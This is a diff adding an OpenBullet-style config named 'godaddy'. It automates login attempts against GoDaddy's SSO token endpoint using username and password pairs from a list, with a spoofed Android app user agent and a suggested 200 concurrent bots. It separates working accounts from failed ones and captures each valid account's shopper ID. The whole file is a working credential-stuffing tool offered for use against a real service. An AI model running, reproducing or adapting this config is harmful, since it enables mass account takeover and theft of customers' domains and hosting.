@@ -1,0 +1,79 @@
+[SETTINGS]
+{
+  "Name": "godaddy",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2021-04-01T12:11:00.5103963+00:00",
+  "AdditionalInfo": "",
+  "Author": "themutualguy",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "juat to know config by themutualguy",
+      "VariableName": "",
+      "Id": 2055415739
+    }
+  ],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#LOGIN REQUEST POST "https://sso.godaddy.com/v1/api/native/com.godaddy.gdm.smartline.android/token" 
+  CONTENT "password=<PASS>&infotoken=true&per=true&username=<USER>&" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "X-NewRelic-ID: VQ8AWFBXDRABV1dbBAUBU1Y=" 
+  HEADER "Accept-Encoding: gzip" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "User-Agent: Dalvik/2.1.0 (Linux; U; Android 8.1.0; BKK-LX2 Build/HONORBKK-LX2)" 
+  HEADER "Host: sso.godaddy.com" 
+
+#CHECK KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Failed to authenticate user" 
+  KEYCHAIN Success OR 
+    KEY "\"code\": 1, \"message\": \"Success\", \"data\"" 
+
+#RESPONSE PARSE "<SOURCE>" LR "" "" -> VAR "5" 
+
+#DECODE FUNCTION URLDecode "<5>" -> VAR "1" 
+
+#SHOPPER_ID PARSE "<1>" LR "\", \"info_shopperId\": \"" "\", \"plid\"" CreateEmpty=FALSE -> CAP "shopper_id" 
